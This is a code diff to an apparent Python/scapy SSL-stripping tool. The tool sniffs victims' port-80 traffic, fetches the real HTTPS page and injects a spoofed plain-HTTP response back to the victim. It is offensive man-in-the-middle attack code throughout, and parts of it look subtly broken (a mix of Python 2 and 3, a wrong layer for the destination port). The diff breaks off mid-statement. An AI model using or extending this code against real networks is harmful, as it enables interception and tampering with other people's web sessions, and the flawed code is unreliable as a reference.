@@ -3,6 +3,8 @@ from scapy.all import *
 import threading
 import time
 import os
+import httplib
+import ssl
 from utils import get_gateway_ip, network_utils
 
 def run(args):
@@ -42,7 +44,7 @@ def start_sniffing(interface):
     sniff(iface=interface, filter="tcp port 80", store=False, prn=ssl_strip)
 
 def ssl_strip(packet):
-    if packet.haslayer(TCP) and packet[TCP].dport == 80:
+    if packet.haslayer(TCP) and packet[IP].dport == 80:
         if packet.haslayer(Raw) and len(packet[Raw].load) > 0:
             try:
                 http_request = packet[Raw].load.decode()
@@ -51,11 +53,23 @@ def ssl_strip(packet):
                     host_line = next(line for line in lines if "Host:" in line)
                     host = host_line.split(' ')[1]
                     path = lines[0].split(' ')[1]
+
+                    https_url = "https://{}{}".format(host, path)
+
+                    context = ssl.create_default_context()
+                    conn = httplib.HTTPSConnection(host, context=context)
+                    conn.request("GET", https_url)
+                    https_response = conn.getresponse()
+
+                    content_type = https_response.getheader('Content-Type')
+                    content_length = https_response.getheader('Content-Length')
+                    response_body = https_response.read().decode(errors='ignore')
                     
                     http_response = "HTTP/1.1 200 OK\r\n" \
-                                    "Content-Type: text/html\r\n" \
-                                    "Content-Length: 0\r\n" \
-                                    "\r\n"
+                                    "Content-Type: {}\r\n" \
+                                    "Content-Length: {}\r\n" \
+                                    "\r\n" \
+                                    "{}".format(content_type, content_length, response_body)
 
                     # Send the HTTP response to the victim
                     spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
